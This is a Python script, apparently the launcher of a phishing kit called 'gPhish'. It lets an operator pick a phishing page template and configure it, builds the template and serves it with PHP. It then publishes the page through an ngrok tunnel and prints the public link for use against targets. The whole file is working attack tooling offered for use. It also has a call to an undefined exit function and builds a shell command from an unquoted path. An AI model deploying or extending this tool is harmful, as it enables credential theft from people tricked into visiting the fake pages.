import os, subprocess, shutil, unicodedata
from termcolor import colored
from art import text2art
from logger import Log
from time import sleep
from pyngrok import ngrok
from InquirerPy import inquirer # Docs: https://github.com/kazhala/InquirerPy/wiki

## Globals
template_path = ""

def normal_exit():
    os.system('clear')
    print(colored('Goodbye!', 'blue'))
    sleep(1)
    exit()

def banner(clear=True):
    ## Clear console
    if clear:
        os.system('clear')
    print(colored(text2art('gPhish', font="smpoison"), 'green'))
    print('By LennyFaze                                v0.1')
    print('Press Ctrl + C to exit\n')

def main_menu():
    global template_path
    try:
        ## Create logs directory if it doesn't exist yet
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        ## Show banner
        #banner()
        
        ## Make user pick category
        category = inquirer.select(
            message='Select a category:', 
            choices=os.listdir('templates/')).execute()

        ## Make user pick template in category
        template = inquirer.select(
            message='Select a template:', 
            choices=os.listdir('templates/' + category + '/')).execute()

        ## Define template path for server process
        template_path = 'templates/' + category + '/' + template
        
        if not os.path.isdir(template_path + '/dist'):
            setup_template()
        else:
            ## Promt user if the template should be rebuild
            rebuild = inquirer.confirm('Rebuild template?', default=False).execute()
            if rebuild:
                setup_template()

        ## Start server if template is already built
        start_server()
    except KeyboardInterrupt:
        ## Handle Ctrl + C
        normal_exit()

def setup_template():
    lines = []
    with open(f"{template_path}/.env.example", 'r') as input_file:
        lines = input_file.readlines()


    for line in lines:
        if(line.startswith('!')):
            value = inquirer.text(
                message=f"Set {line[line.find('!')+1 : line.find('=')]}:", 
                default=line[line.find('#(')+3 : line.find(')#')-1]).execute()
            if len(value) > 1:
                lines[lines.index(line)] = line[line.find('!')+1 : line.find('=')] + "='" + value + "'"
            else:
                lines[lines.index(line)] = line[line.find('!')+1 : line.find('=')] + "=" + line[line.find('#(')+2 : line.find(')#')]

    
    ## Delete old .env file if exist
    if os.path.exists(f"{template_path}/.env"):
        os.remove(f"{template_path}/.env")

    ## Create new .env file
    with open(f"{template_path}/.env", 'w') as output_file:
        for line in lines:
            output_file.write(line)

    Log.info('Building template, please wait...')
    builder = subprocess.Popen(f"cd {template_path} && yarn build", shell=True)

    ## Wait until builder is finished
    try:
        builder.wait()
    except KeyboardInterrupt:
        exit_normally()
    
    Log.success('Building finished')
    start_server()

def start_server():
    ## Start server
    Log.info('Copying files to server...')

    # Delete old template if not deleted yet
    if os.path.isdir('server/public/'):
        shutil.rmtree('server/public/')
    # Copy selected template to server
    shutil.copytree(template_path + '/dist', 'server/public/')

    Log.info('Staring server...')
    server = subprocess.Popen(f"php -S 127.0.0.1:8080 -t server/public/", 
        stdout=open('logs/serverlog.txt', 'w'), 
        stderr=open('logs/serverlog.txt', 'w'))
    Log.success('Server running.')

    Log.info('Creating ngrok tunnel...')
    ngrok.connect(8080)
    Log.success('Ngrok tunnel opened:')
    print(f"  Local URL: \t{colored(ngrok.get_tunnels()[0].config['addr'], 'cyan')}")
    print(f"  Public URL: \t{colored(ngrok.get_tunnels()[0].public_url, 'cyan')}")
    
    ## Let server run until user stops it
    try:
        server.wait()
    except KeyboardInterrupt:
        Log.info('Ctrl + C pressed, Killing server...')
        server.kill()
        shutil.rmtree('server/public/')
        Log.success('Server killed')
        Log.info('Killing ngrok...')
        ngrok.kill()
        Log.success('Ngrok killed')
        sleep(2)
        normal_exit()
    except:
       Log.error('An unknown error occured')


main_menu()